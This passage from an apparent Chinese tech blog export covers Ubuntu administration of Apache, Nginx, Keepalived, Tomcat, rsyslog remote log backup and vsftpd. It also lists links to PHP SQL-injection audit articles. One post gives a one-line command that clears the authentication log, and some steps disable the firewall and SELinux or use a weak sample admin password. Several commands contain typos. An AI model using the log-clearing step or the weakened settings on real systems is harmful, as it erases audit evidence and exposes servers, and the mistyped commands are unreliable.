最大并发数（默认8192）\nAPACHE_ULIMIT_MAX_FILES='ulimit -n 65536'\n```\n\n\n#### 模块化\n服务器核心只实现了基本功能\n```bash\napache2 -l  # 查看默认被编译到apache核心包里面的模块\n```\n其他功能通过模块实现\nubuntu编译动态加载模块实现运行时模块调用\n```bash\napt search libapache2-mod\t\t# 搜索模块\nsudo apt install libapache2-mod0auth-mysql\t# 安装模块\nsudo a2enmod auth_mysql\t\t\t# 启用模块\nsudo a2dismod auth_mysql\t\t# 禁用模块\n```\n\n#### 开启HTTPS\n`传输过程中`的CIA (机密性、完整性、可用性)，但是不提供`应用层`安全\n```bash\n# /etc/apache2/sites-available/default-ssl.conf\nsudo a2ensite default-ssl  # 开始ssl加密(默认未启动)\nsudo a2ebmod ssl\t# 默认未启动\n\n_default_:443\t# 未指定虚拟主机情况下的443端口访问, 默认是443(除了其他指定了虚拟主机名的，未指定的就访问到这里)\nSSLEngine on\t# 开启SSl/TSL\nSSLCertificateFile  /etc/ssl/certs/ssl-cert-snakeoil.pem  # 证书文件(默认已经自带了一张证书)\nSSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key\nSSLCertificateChainFile /etc/apache2/ssl.crt/server-ca.crt  # 证书的加密链文件\nSSLCARevocationFile /etc/apache2/ssl.crl/ca-bundle.crl      # 证书吊销列表\nSSLVerifyClient require   # 要求客户端提供证书(不可抵赖性)\n\n<FilesMatch \"\\.(cgi|shtml|phtml|php)$\">   # 基于文件类型，设置不同环境变量进行加密\n      SSLOptions +StdEnvVars\n</FilesMatch>\n<Directory /usr/lib/cgi-bin>    # 对指定目录\n      SSLOptions +StdEnvVars    # 标准环境变量\n</Directory>\n\nssl-unclean-shutdown   # 只是服务器端向客户端断开连接(追求速度)\nssl-accurate-shutdown\t# 服务器端与客户端的连接端口了，客户端还有向服务端再确认(追求稳定性)\n\nnokeepalive ssl-unclean-shutdown\ndowngrade-1.0 force-response-1.0\t# 降级响应\n\n# 还可以按自己需要...\n\n## 启用并重启服务\nsudo a2ensite default-ssl\nservice apache2 reload\nsudo systemctl restart apache.service\n\n## 可以访问了(ubuntu自己生成的证书浏览器会提示不安全)\n```\n\n###### 证书\n向证书颁发机构申请的合法证书就可以替换ubuntu自带的证书\n```bash\n# 使用CA机构签名证书\nsudo openssl req -newkey rsa:2048 -nodes -keyout server.key -out server.pem\n\n# 使用自签名证书\nsudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/mysite.key -out /etc/ssl/certs/mysite.pem\n```\n\n\n###### 创建`HTTPS`虚拟主机\n和创建一般虚拟主机是类似的\n\n<img src=\"http://image.xpshuai.cn/20200425131432963_15883.png\" />\n\n建议商业证书颁发机构(权威机构颁发，默认受信，增强特性，收费高昂，有效期长)\n\n**那没钱怎么办呢？**\n有几家机构已经有免费的了，比如`Let's encrypt`\n**Let's encrypt**\n- 致力于加速全文实现https的免费证书颁发机构\n- 证书有效期90天(可刷新)\n- 专门客户端程序 `Certbot`，简化证书步骤\n```bash\nsudo add-apt-repository ppa:certbot/certbot  # 添加仓库\nsudo apt update\nsudo apt install cerbot  python-cerbot-apache\n```\n\n使用方法：\n```bash\n# 前提\n域名正常解析、设置好虚拟主机\n\n# 申请证书 (--apache意思是给apache用的， -d是域名,还有子域名)\nsudo certbot --apache -d example.com -d www.example.com\n\n# 证书位置\n/etc/letsencrypt/live\n\n# 查看证书状态(换成自己的域名)\nhttps://www.ssllab.com/ssltest/analyze.html?d=example.com&latest\n```\n\n\n\n#### Apache支持PHP\n1.安装\n```bash\nsudo apt install php7.2 libapache2-mod-php7.2   # mod-php模块\n# 验证 \nphp -v\n```\n\n2.启用模块\n```bash\n# 直接启用即可\na2enmod php7.2\n\n# Apache对php的支持是模块化的，而Nginx对php支持的配置方式比较原始\n```\n\n索引文件\n```bash\nvim  /etc/apache2/mods-available/dir.conf       # index.php\n\n# 重启\nsudo systemctl restart apache2\n```\n\n配置文件\n```bash\n/etc/php/7.2/    # 下面不同的目录，是针对不同应用的，这里apache的在apache子目录下面\n/usr/lib/php/7.2/    # 为不同的使用场景的配置文件(开发环境与生产环境，一般情况下会把这里的文件链接到上面的配置中)\n```\n\n\n\n## <font color=red>Keepalived</font>\n高可用的一种解决方案：Keepalived\n\n#### 实现高可用(HA)\n- 在服务器组内漂移的VIP（多台服务器实现一个组，但也是一个域名，解析到一个ip）\n- Master独占VIP，其他Server检查Master可用性\n- Keepalives并非专门针对Apache而设计\n- 常用于负载均衡技术环境\n- 组内服务器应提供相同内容和配置\n\n组内不同服务器有优先级，多个服务器共用一个漂移的ip地址(VIP)，处于正常状态的服务器叫Maste\n\n\n#### 安装\n```bash\nsudo apt-get install keepalived\n\n# 因为无配置，所有默认启动失败\n/etc/keepalived/keepalived.conf\t\t# 配置文件（需要创建）\n```\n配置文件：\n```bash\n# 可选配置项，但是一般建议配置\nglobal_defs {  \n    notification_email {\n    myemail@mycompany.com   # 发送邮件给谁\n    }\n    notification_email_from keepalives@mycompany\n    smtp_server 192.168.1.150\n    smtp_connect_timeout 30\n    router_id mycompany_web_prod\n}\n# 关键配置\n# 1号配置实例\nvrrp_instance VI_1 {\n    smtp_alter\n    interface enp0s3\t # 网卡接口优先级\n    virtual_router_id 51 # 定义服务器组\n    priority 100\t\t # 优先级(自己定义，保证顺序即可)\n    advert_int 5\t\t # 周期性通告的间隔时间\n    virtual_ipaddress {  \n        192.168.1.200\t # VIP（DHCP以外）\n    }\n}\n\n\n# 重启服务\n```\n\n```bash\nsystemctl start keepalived \nsystemctl status -l keeplived\n# 网卡绑定VIP\n\t ip a\n\t 等待30s\n\n# 安装第二台服务器，并进行类似的配置(优先级修改,vip地址填写一样的)\n\n# 模拟切换\nsystemctl stop keepalived \nsystemctl start keepalived \n```\n\n不仅可以配合Apache使用，还可配合其他使用\n\n\n\n\n\n\n## <font color=red>Ubuntu 18.04新特性</font>\n哈哈哈，前几天20.04都已经正式发布了，我听课进度太慢\n>内核是关键\n\n<img src=\"http://image.xpshuai.cn/20200425142824240_1739.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200425144457182_27054.png\" />\n\n###### 网络配置\n\n<img src=\"http://image.xpshuai.cn/20200425145333762_14082.png\" />\n<img src=\"http://image.xpshuai.cn/20200425145724172_15710.png\" />\n多个地址，要用逗号分隔\n重启服务：`sudo netplan apply`\n\n<img src=\"http://image.xpshuai.cn/20200425145944914_17134.png\" />\n桥接的物理网卡设置为没有ip\n\n**桌面端：**\n\n<img src=\"http://image.xpshuai.cn/20200425150429971_9910.png\" />\n\n\n```bash\n# ifconfig / ifup / if down  已经默认不安装了\n# 对应上面\nip link set eth0 up  / ip link set eth0 down\n```\n\n**networkctl命令**\n```bash\n# 此命令地位更加突出\nnetworkctl status / networkctl status eth0   # 查看不同网卡的状态和详细信息\n```\n\n\n**ip命令**\nip link\n```bash\nsudo ip link ens33 down  # down掉, 相当于ifup\nsudo ip link ens33 up    # 启动网卡, 相当于 ifdown\n\nip link ls ens33  # 查看网卡的link信息\nip -s -d link ls ens33  # 查看网卡的link信息(更详细)\nip -s -s -d link ls ens33  # 查看网卡的link信息(更更详细)\nip link set dev ens33 mtu 1500  # 修改MTU\nip link set dev ens33  address 00:11:22:33:44:55  # 修改MAC\n```\n\nip addr\n```bash\nip addr    # ip a\nip addr show  # 跟上面没什么差别\n\nip addr add dev ens33 192.168.1.10/24  # 手动给网卡添加ip\nip addr del dev ens33 192.168.1.10/24  # 手动给网卡删除ip\nip addr fulsh dev ens33  # 清除网卡信息\n```\n\nip route\n```bash\nip route show  # 查看路由信息   ip route\nip route get 1.1.1.1   # 查看到达指定目的ip，计算要经过的路由\nsudo ip route default via 192.168.1.2  # 添加默认路由(网关地址)\nsudo ip route dev ens33 2.0.0.0/8 via 192.168.1.1 # 指定去往某个网络，都要经过1.1这个路由，并指定网卡进行转发\n```\n\nip maddress\n```bash\n# 组播地址\nip maddress # 查看所有网卡都属于哪个组播地址\nip maddress ls ens33  # 查看指定网卡属于哪个组播地址\nip maddress add 33:33:00:00:00:01 dev ens33 # 把哪个网卡加入到某个组播地址\n```\n\nip neighbor\n查arp缓存\n```bash\n# 查看\nip neigh\nip -s -s neighbor show\n# 手动绑定ip与mac地址（防止arp欺骗）  lladdr即逻辑链路层地址， perm是永久生效\nip neighbor add dev ens33 192.168.0.131 lladdr 00:11:22:33:44:55 nud perm\n```\n\nip monitor\n监视网络里面地址等解析的变化\n```bash\nip monitor all\n# 有着不同的状态\n```\n\n\n\n## <font color=red>Nginx</font>\n- 开源，轻量，快速，可扩展的Web服务器\n- Github, Netflix, Wordpress都基于Nginx\n- 但是可配置能力弱于Apache\n- 适用于大流量，高并发环境（稳定快速，占用资源少--C10K问题）\n- 在Top 1000个网站中使用率最高\n\n**Apache基于线程**\n- 基于进程(运行中的文件就叫进程)消耗资源多\n- 同进程下的多线程共享内存（一损俱损）\n\n**Nginx使用事件驱动的架构**\n- 新客户端请求时不创建新的进程/线程\n- 事件处理器处理请求任务\n- 更少的处理时间，更少的内存消耗\n\n**Apache与Nginx共用**\n- Apache处理动态内容\n- Nginx处理静态内容\n\n\n#### 安装\n```bash\nsudo apt install nginx\n\n# 配置文件在 /etc/nginx\n```\n\n\n#### 配置文件\n```bash\n# /etc/nginx\n# 主配置文件 nginx.conf\n\n# 虚拟主机配置文件\nsites-available\nsites-enabled    # 启用的，是个链接\n\nsnippets    # 可以复用的片段\n```\n\n###### 主配置文件\n```bash\n# /etc/nginx/nginx.conf\nuser www-data;        # 用户\nworker_processes auto;    # 进程数\ninclude /etc/nginx/modules-enabled/*.conf;    # 引入的模块配置\n\nevents {\n    worker_connections 768;  # 每个进程最大的并发连接数\n    # multi_accept on;\n}\n\nhttp {\n    sendfile on;    # 对内核 静态资源的访问速度(都要开着)\n    tcp_nopush on;    # 优化了对tcp协议栈性能(优化了数据包的大小,多个小包变成大包再发)\n    tcp_nodelay on;   # 与上面的参数相反(从发包的延时进行优化,来一个包就发)\n    keepalive_timeout 65;        # 没一个TCP连接最大的保活的时间\n    types_hash_max_size 2048;    # MIME类型镜头内容hash表大小\n\n    ##\n    # Virtual Host Configs\n    ##\n    include /etc/nginx/conf.d/*.conf;\n    include /etc/nginx/sites-enabled/*;\n}\n\n```\n\n###### 虚拟主机配置文件\nip和端口一样，使用不同域名来指向不同站点\n```bash\n# /etc/nginx/sites-available/    # 可用站点\n# /etc/nginx/sites-enabled/      # 已启用站点\n\n# /etc/nginx/sites-available/default\nserver{\n    listen 80 default_server;    # 侦听的端口\n    root /var/www/htmll;    # 根目录\n    index index.html index.htm index.nginx-debian.html;    # 索引文件\n    server_name www.xpsshuai.cn;    # 主机名(域名)\n}\n\nlocation / {    # 主url\n    # First attempt to serve request as file, then\n    # as directory, then fall back to displaying a 404.\n    try_files $uri $uri/ =404;    # 资源没有就404\n}\n```\n\n\n#### 新建虚拟主机(Server Blocks)实例\n>Nginx中叫`服务器块`，但东西跟Apache中虚拟主机是一样的\n\n```bash\nsudo mkdir /var/www/qq.com\n# 每个单独的Server Block一个配置文件\nsudo cp /etc/nginx/sites-available/default  /etc/nginx/sites-available/qq.com\nsudo vim /etc/nginx/sites-available/qq.com \n# 内容\nserver{\n    listen 80;   # 因为这里都侦听80端口，所以为了和默认站点区分，要指定不同域名   \n    server_name www.qqq.com;   \n    root /var/www/qq.com;    \n}\n# 其他配置项可以取消注释自行配置\nlocation ~ /\\.ht {   # 这个建议启用，以..开头,以ht结尾的你我们就拒绝访问-->当然也可以增加更多策略\n   deny all;\n}\n\n\n# 创建启用的符号链接(Apache是site2enable，这里没有专门的命令)\nsudo ln -s /etc/nginx/sites-available/qq.com  /etc/nginx/sites-enabled/qq.com \n# 重启\nsudo systemctl restart nginx\n\n# 访问域名，就会访问到qq.com，因为请求中的host字段是不一样的\n\n# 其他站点同上\n```\n\n\n#### Nginx支持PHP\nWebServer本身只是提供资源的，必须配合php等脚本才能进行逻辑的运算\n\n1.安装fastCGI process manager(FPM)  --> 就能配合Nginx配合进行处理(Nginx把接收到的请求转发给php处理)\n```bash\nsudo apt install php-fpm   # 安装\n\n# 查看位置  ls /var/run/php/\n/var/run/php/php7.2-fpm.sock  # 进程名称(记住路径)\n# 验证 \nphp -v\n    \n```\n\n2.配置Nginx\n```bash\n# 修改配置  sudo vim /etc/nginx/sites-available/qq.com\nlocation ~ \\.php$ {   # 匹配所有访问.php的请求\n        include snippets/fastcgi-php.conf;\n        fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;    # 意思是: 把所有访问.php的拓展名的资源，都转发给这里pass的php进程\n    }\n# 还有，索引页面也要添加 index.php\n```\n\n3.配置PHP\n```bash\n# sudo vim /etc/php/7.2/fpm/php.ini\n# 这里只简单讲几个配置\ncgi.fix_pathinfo=0       # 必须修改为0, 安全\nfile_uploads = On         # 如果不需要就关掉，看自己需求\nmax_file_uploads = 20    # 限制单个文件上传大小\nallow_url_fopen = On     # 是否允许文件包含(如果没业务需要，建议关闭)\nallow_url_include = Off\nmemory_limit = 128M      # 指定内存大小(最小128M,看业务需求)\n```\n\n4.重新加载\n```bash\nsudo nginx -t\nsudo systemctl reload nginx\n# 重启php\nsudo systemctl restart php7.2-fpm\n```\n\n5.重新访问php页面，查看是否正确解析\n\n\n\n#### Nginx支持SSL\n**自签名证书** (自己测试或者不需要那么安全的情况下) --> 机密性和完整性可以保证，但是身份认证是不会被公网所信任的\n```bash\n# x509标准格式的, 私钥是绝对不能泄漏的, 后面是绑定的一个证书\nsudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/qq.key -out /etc/ssl/certs/qq.pem\n# 一旦域名绑定了证书，就必须通过这个域名来访问\n\n# 若向CA证书颁发机构申请证书方法 同上Apache\n```\n\n服务块配置\n```bash\n# sudo vim /etc/nginx/sites-available/qq.com\nserver {\n     listen 443 ssl;        # 443端口是 ssl, 通过https访问\n     server_name www.qqq.com;\n     ssl_certificate /etc/ssl/certs/qq.pem;\n     ssl_certificate_key /etc/ssl/private/qq.key;\n\n     root /var/www/qq.com\n}\n\n# 重启服务\nsystemctl restart nginx\n\n\n# 访问https://xxxxxx    会发现浏览器会提示证书不信任\n```\n\n**Let's encrypt**\n第三方的https的开源的免费证书颁发机构，向他来申请证书\n\n1.安装\n```bash\nsudo add-apt-repository ppa:certbot/certbot  # 添加仓库\nsudo apt update\nsudo apt install cerbot    # 客户端程序(简化了申请流程)\nsudo apt install python-cerbot-nginx\n```\n\n2.使用方法：\n```bash\n# 前提\n域名正常解析、设置好虚拟主机\n\n# 2.1申请证书 (--nginx意思是给nginx用的， -d是域名,还有子域名) , -m是管理员邮箱\nsudo certbot --nginx -d example.com -d www.example.com -m admin@example.com\n\n# 证书存放位置\n/etc/letsencrypt/live\n\n# 2.2修改自己配置文件中证书的位置\n# sudo vim /etc/nginx/sites-available/qq.com\nssl_certificate\n\n\n# 2.3 手动证书更新(因为默认证书有效期是90天)\nsudo certbot renew --dry-run\n\n# 2.4测试 查看证书状态(输入自己的域名) 可以查看到一些安全隐患等详细信息\nhttps://www.ssllab.com/ssltest/\n# ssl的信息扫描(不安全的地方)也可以使用自己本地的工具\n```\n\n\n#### Nginx反向代理\n>很多情况下，Nginx不是作为WebServer使用的，最常见的就是作为`反向代理`\n\n首先说一下`代理`:     代理客户端访问外网服务器。代理是重新生成的请求(比如公司内部限制员工上网的场景)\n`反向代理`：\n    - 代理服务器对外提供服务，接受客户端请求\n    - 安全层过滤客户端恶意请求(云)\n    - 可以放在防火墙外面，甚至放在云上(云WAF本质上就是反向代理, 请求通过DNS解析到云waf上，进行过滤)\n\n- Apache不适用于高并发，高负载环境\n- Nginx没有内建支持动态内容处理能力\n\n**结合Apache/Nginx的优势**\n- Nginx接受入站请求和静态内容缓存，动态请求发给Apache\n- Apache完成动态内容处理\n- Nginx作为反向代理（动态请求转发给Apache）\n- Nginx放在WebServer前面，再将请求发给WebServer。然后服务端把数据通过Nginx向用户交付数据\n- 不仅减缓了Apache的流量压力，也进行了一定的安全过滤\n\n\n#### Nginx实现反向代理\n>同一台服务器的流量转发\n\n1.本机安装Apache\n```bash\n注意: 先停掉nginx的服务\nsystemctl stop nginx\n再安装\nsudo apt install apache2\n```\n\n2.修改Apache侦听端口\n```bash\n1.\n# vim /etc/apache2/ports.conf\n#让apache不占用80, 让nginx侦听80端口\n Listen 8080\n<IfModule ssl_module>\n   Listen 8443\n</IfModule>\n<IfModule mod_gnutls.c>\n    Listen 8443\n</IfModule>\n\n2.修改apache虚拟站点默认侦听端口\nvim /etc/apache2/sites-available/000-default.conf\n也改为8080\n\n3.重启服务\nsystemctl restart apache2\n```\n\n3.Nginx反向代理设置\n```bash\n# vim /etc/nginx/sites-available/default\n#修改nginx配置，侦听80端口，然后动态部分的流量转发给apache,而静态文件还是放Nginx上读取(这里以php为例)\n# 动态内容进行转发\nlocation ~ \\.php$ {\n     include snippets/fastcgi-php.conf;\n     # fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;   # 这里就不用nginx解析php了，用apache(配置在上面小结)\n     proxy_pass  http://127.0.0.1:8080;  # 凡是php的动态内容都转发给本机的8080(即Apache)\n     proxy_set_header X-Real-IP $remote_addr;  # 通常会添加一些代理请求头(便于区分)\n     proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 这个头部虽然不是RFC标准，但是也是记录了经过了哪些代理地址\n     proxy_set_header Host $host;\n    proxy_set_header X-Forward-Proto $scheme;\n    }\n# 静态内容留给自己（增加一个location）      \nlocation ~* \\.(js|css|jpg|png|svg|html|htm)$ {\n   expires 10d;   # 指定过期时间 10天\n}\n```\n\n4.检查Nginx配置并重启\n```bash\nsudo nginx -t  # 检查配置语法\nsudo systemctl restart nginx  # 重启\n```\n\n5.配置Apache支持php解析\n```bash\n# 1.安装\nsudo apt install php7.2 libapache2-mod-php7.2   # mod-php模块\n# 验证 \nphp -v\n\n# 2.启用模块\na2enmod php7.2\n\n# 3.索引文件\nvim  /etc/apache2/mods-available/dir.conf       # 增加index.php\n\n# 4.重启apache\nsudo systemctl restart apache2\n```\n\n6.测试能否正常访问\n\n\n\n#### 多台服务器的Nginx反响代理，进行流量转发\n实验环境：一台ubuntu安装apache, 两台虚拟机安装Nginx\n客户端向第一台Nginx服务器发送请求，转发给第二台Nginx服务器，然后转发给最后一台Apache\n链式代理\n\n\n**1.Nginx机器 N1**\n1.安装Nginx\n2.配置(这里做实验就简单地用了默认的配置了)\n```bash\n# /etc/nginx/sites-available/default\nlocation / {   # 所有发到我这里的请求都转发给N2\n    proxy_pass http://192.168.0.104;\n}\n```\n3.重启Nginx\n\n\n**2.Nginx机器 N2**\n1.安装Nginx\n2.配置\n```bash\n# /etc/nginx/sites-available/default\nlocation / {   # 所有发到我这里的请求都转发给N2\n    proxy_pass http://192.168.0.105;\n}\n```\n3.重启Nginx\n\n**3.Apache机器 A3**\n安装apache\n然后客户端访问N1, 就会看到A3的页面\n\n\n\n\n#### Nginx负载均衡\n> 基于反向代理实现负载均衡\n\n**负载均衡：** 前面放一个Nginx进行反向代理，后面放多个Apache作为WebServer\n\n**基本配置**\n```bash\n# 定义一个服务器组(要转发到的目标组)\nupstream srvs {  # upstream只是一个组的名称\n    least_conn;        # 负载均衡方法规则 --最少连接数优先 (详细见下面)\n    server 192.168.106:80  weight=1;  # server 是后面的一个WebServer(apache或Nginx)的地址， weight 是权重(越大接收的流量就越多)\n    server 192.168.106:80  weight=2;  \n}\n\n# 配置\nserver {\n    location / {\n        proxy_pass http://srvs;   # 上面定义的组的名称(不需要被DNS解析，仅仅是一个标识)\n    }\n}\n\n```\n\n**负载均衡方法**\n```bash\nround-robin       # 论询\nleast_conn        # 最少连接数优先(已经建立的连接数)\nleast_time        # 响应速度最快\nhash              # 基于请求的Hash值\nip_hash           # 基于ip地址的hash值(适用于需要会话保持的场景)\n```\n\n\n\n#### 日志\n```bash\n/var/log/nginx/access.log\n/var/log/nginx/error.log\n```\n\n\n\n\n\n\n\n## <font color=red>Tomcat</font>\nTomcat是由Apache组织开发的一个Servlet(Server Applet)容器\n- 实现对servlet, JSP, JAVA Socket等支持\n- 包含http服务器\n- 作为中间件使用\n- 可与Nginx结合使用(只用Tomcat的话, 抗压能力强)\n\n\nservlet是优于CGI的方式的\n\n###### 安装 open jdk\n一般tomcat和java配合较多\njdk是开发环境，jre是运行环境\n```bash\nsudo apt install default-jdk  #安装openjdk。 使用默认版本 或者指定openjdk-8-jdk      \n```\n\n###### 安装 oracle jdk\n安装\n```bash\nsudo apt install software-properties-common -y\nsudo add-apt-repository ppa:webupd8team/java\nsudo apt install oracle-java8-installer -y\n```\n\njava版本选择\n```bash\nsudo update-alternatives --config java\nsudo update-alternatives --config javac\n\njava --version\n```\n\n或者手动下载oracle jdk包\n\n\n\n###### 官方库安装tomcat\n```bash\n# ubuntu中收录的8\nsudo apt install tomcat8\nsudo apt install tomcat8-docs\nsudo apt install tomcat8-admin\nsudo apt install tomcat8-examples\n\n# tomcat默认不是主要作为WebServer的，一般是配合Apache和Nginx，所以默认使用8080端口\n```\n\n\n###### 手动安装tomcat\n适用于指定具体版本\n1.先安装jdk\n```bash\n\nsudo apt install default-jdk  #安装openjdk。 使用默认版本 或者指定openjdk-8-jdk   \n# 验证\njava --version\n\nsudo useradd -m -U -d /opt/tomcat -s /bin/false tomcat       # 创建tomcat帐号（home放在opt下面）\n```\n\n2.再下载安装包\n<img src=\"http://image.xpshuai.cn/20200428150102394_2075358316.png\" />\n\n3.移动到/opt/tomcat目录\n```bash\nmv apache-tomcat-8.5.31 /opt/tomcat/\n```\n\n4.修改该文件递归的属主属组改为新建的`tomcat`用户\n```bash\n# 建议建立符号链接 \nsudo ln -s /opt/tomcat/apache-tomcat-8.5.31 /opt/tomcat/latest  # 把新版本添加链接即可(版本更新之后不需要更改配置文件，配置文件都配置latest,而只需把latest修改指向即可)\n\nsudo chown -R tomcat:/opt/tomcat\nsudo chmod +x /opt/tomcat/latest/bin/*.sh\n# sudo chmod +x /opt/tomcat/apache-tomcat-8.5.31/bin/*.sh\n```\n\n\n5. 手动创建systemd管理文件(手动安装就没有systemd的后台管理文件)\n`/etc/systemd/system/`\n`sudo vim tomcat.service`\n配置内容如下\n<img src=\"http://image.xpshuai.cn/20200428152651153_2000734872.png\" />\n\n\n6.启动服务\n```bash\n# 重新reload\nsudo systemctl daemon-reload\n# 启动tomcat\nsudo systemctl start tomcat\nsudo systemctl status tomcat\n# 设置开机启动启动\nsudo systemctl enable tomcat\n```\n\n7.Web管理接口配置\n```bash\n# http://ip:8080/manager/\n# tomcat管理页面，默认是只允许本机访问的\n## 1.若想开启，就需进行配置（这里指定允许某个ip访问）\nsudo vim /opt/tomcat/latest/conf/tomcat-user.xml       # 自动安装tomcat后的路径在/etc\n<tomcat-user>\n    <role rolename=\"admin-gui\"/>    # 定义两个角色\n    <role rolename=\"manager-gui\"/>\n    <user username=\"admin\" password=\"qwe123\" roles=\"admin-gui, manager-gui\"/>   # 定义用户\n</tomcat-user>\n\n## 2.指定登录主机\n# sudo vim /opt/tomcat/latest/webapps/manager/META-INF/context.xml   #  自动安装tomcat后的路径自己找\n如下图(懒得弄格式了)\n\n# sudo vim /opt/tomcat/latest/webapps/host-manager/META-INF/context.xml\n这是管理主机的配置文件\n\n## 3.重启服务，然后测试\nsystemctl restart tomcat8\nxxx:8080/manager/html        # 管理页面就可以部署war包等操\nxxx:8080/host-manager/html\n```\n\n\n<img src=\"http://image.xpshuai.cn/20200428154603944_415659665.png\" />\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["反向代理"],"categories":["Linux"]},{"title":"【PHP代码审计】 那些年我们一起挖掘SQL注入--集合","url":"%2Fposts%2F43402%2F","content":"\n  \n\n###### 仅仅是简单把网上的文章放在一起，方便自己学习\n\n1. https://www.cnblogs.com/xiaozi/p/5538369.html\n2. https://www.cnblogs.com/xiaozi/p/5538372.html\n3. https://www.cnblogs.com/xiaozi/p/5538374.html\n4. http://www.mamicode.com/info-detail-1391858.html\n5. https://www.cnblogs.com/xiaozi/p/5538380.html\n6. https://www.cnblogs.com/xiaozi/p/5538382.html\n7. https://www.cnblogs.com/chunguang/p/5583875.html","tags":["代码审计"],"categories":["渗透测试"]},{"title":"Linux日志异地备份","url":"%2Fposts%2F52918%2F","content":"  \n## 日志的异地备份\n\n> 日志服务器的建立尤其重要\n\n这里使用Centos的登录日志做实验\n\n\n\n`tail -f /var/log/secure` 实时查看日志变化\n\n`echo \" \" > var/log/secure` 最简单的清理日志\n\n\n\n#### 常见日志文件\n  \n```bash\n/var/log/messages        大多数系统日志信息记录在此处\n/var/log/secure            安全和身份认证相关的信息和错误的日志文件\n/var/log/mallog            与邮件服务器相关的日志文件\n/var/log/cron            与定时任务相关的日志文件\n/var/log/boot.log        与系统启动有关的日志文件\n```\n\n\n\n\n\n#### 发送方：\n\n###### 考虑问题\n\n1.我发送什么信息表到日志服务器\n\n2.考虑发送到ip哪个端口\n\n3.使用什么协议\n\n\n\n###### 配置\n\n配置文件\n\n```bash\nvim /etc/rsyslog.conf\n\n# 这里配置登录日志， 指定日志类别和等级，协议和端口\n### begin forwarding rule ###\n#*.* @@remote-host:514      @@代表使用TCP\n\nauthpriv.* @@192.168.0.111:514\n\n```\n\n```bash\n### Note：\n# 1.暂时关闭防火墙 \nsetup  # 关闭防火墙\niptables -nL # 查看一下\n\n# 2.关闭SELinux\nsetenforce 0\ngetenforce\n\n# 重启rsyslog 服务\n```\n\n\n\n\n\n#### 接收方：\n\n###### 考虑问题\n\n1.收谁的日志\n\n2.收完存哪\n\n3.用什么协议\n\n\n\n###### 配置\n\n配置文件\n\n```bash\nvim /etc/rsyslog.conf\n\n\n# 指定协议和端口\n# Provides TCP syslog reception\n$ModLoad imtcp\n$InputTCPServerRun 514\n\n# 收谁的，存哪\n# 按照ip地址来收\n:fromhost-ip, isequal, \"192.168.0.100\" /var/log/client_log/192.168.0.100.log\n```\n\n```bash\n# 重启rsyslog 服务\n\nnetstat -antlp |grep 514  # 查看端口是否开始监听了\n```\n\n\n\n完成","tags":["异地备份"],"categories":["Linux"]},{"title":"ubuntu server-文件服务","url":"%2Fposts%2F50043%2F","content":"\n\n\n# 文件服务\n\n>我的就是你的 -  你的还是你的\n\n网络诞生最初的动因是去中心化和资源共享  \n文件是初期最主要的资源共享形式（把文件存放在集中的位置供大家访问）  \n\n去中心化是另外一个话题\n\n- 早期的军事需求\n- 现在的信任需求\n\n## <font color=red>FTP服务</font>\n\n最古老的就是FTP  \n\n- 产生于安全出现之前\n- 明文传输一切\n- 目前主要用于公开提供的文件下载服务(目前还没消亡)\n- 使用简单、兼容性好\n- 还有SFTP、FTPS等\n\n###### FTP服务端软件\n\n- Server U\n- vsftpd\n- Proftpd\n\n###### 为了安全考虑\n\n- 独立部署于企业防火墙之外\n- 只读挂载存储或采用只读存储设备(CD / DVD)\n\n\n\n## <font color=red>vsftp安装和配置和管理</font>\n\nvsftpd  --  灵活、安全的FTP服务端软件\n\n#### 安装\n\n```bash\nsudo apt install vsftpd\n\n# 安装过程中生成ftp账号（anonymous） 主目录在：/srv/ftp\n# 默认是21端口进行会话\n```\n\nFTP账号\n\n```bash\n# 安装完之后会自动创建一个ftp账号（这个账号是不能使用shell和登录机器 ）\n/etc/passwd    # bin/false   表示不能使用shell\n/etc/shadow    # *\t表示不能使用终端\n/srv/ftp\t\t   # ftp用户主目录\n```\n\n#### 配置\n\n两种配置模式\n\n```bash\nanonymous\t\t# 匿名模式（适用于公开共享文件） -- vsftpd安装好之后是默认禁用匿名登陆的\nStandard\t\t# 认证模式\n```\n\n常见FTP客户端\n\n```bash\n# 用哪个账号登录，看到的文件就是哪个用户的主目录\n\n# 1.使用命令行连接ftp服务器\nftp 192.168.1.130\n\n# 2.浏览器\nftp://192.168.111.130\n\n# 3.ftp客户端访问程序（FileZilla）\n\n# 4.文件同步客户端软件\n```\n\n##### 1.匿名登录\n\n配置文件位置\n\n```bash\n/etc/vsftpd.conf    # 主配置文件\n```\n\n**开启匿名模式**\n\n```bash\nsudo vim /etc/vsftpd.conf \n# 修改内容为\nanonymous_enable=YES\t# 启用匿名账号登录\nlocal_enable=NO\t\t\t# 禁用认证用户登录\n\n# 重启vsftpd服务，检查状态\n\n然后使用账号anonymous登录(命令行需要,其他方式不用)，密码不用输即可()\n看到的目录是`/srv/ftp/`\n```\n\n**开启匿名账号上传**\n默认：匿名账号是不允许匿名上传的\n\n```bash\nsudo vim /etc/vsftpd.conf \n# 修改内容\nwrite_enable=YES\t# 全局设置（以下配置生效的依赖）\nanon_upload_enable=YES\t# 允许匿名上传文件\nanon_mkdir_write_enable=YES\t# 允许匿名创建目录\n\n# 重启服务，检查状态\nsudo systemctl restart vsftpd.service\n\n但是还是不能上传的（因为vsftpd强制禁止在根目录下匿名上传）\nNote： ftp的主目录是不能进行上传文件的，因为这个目录对同组用户没有写的权限(`ls -ld`查看当前目录的权限)，就算你chmod修改了权限也是不行的\n【解决办法】:在根目录新建文件然后上传\nsudo mkdir /srv/ftp/upload  # 创建上传目录\nsudo chown ftp:ftp /srv/ftp/upload # 配置新建文件系统属主数组\n\n# 继续新增配置  /etc/vsftpd.conf \nanon_umask=022  # 上传文件权限掩码(让上传的文件配置不同的权限 -- 看自己需要来配置)\nanon_other_wrote_enable=YES\t# 允许删除和重命名(否则删除不了也无法重命名)\n```\n\n**修改FTP主目录**\n\n```bash\nsudo mkdir /srv/files/ftp\nsudo chown -d /srv/files/ftp ftp\n```\n\n\n**文件传输日志**\n默认是开启的，可以查看恶意文件上传记录\n\n```bash\n# sudo vim /etc/vsftpd.conf 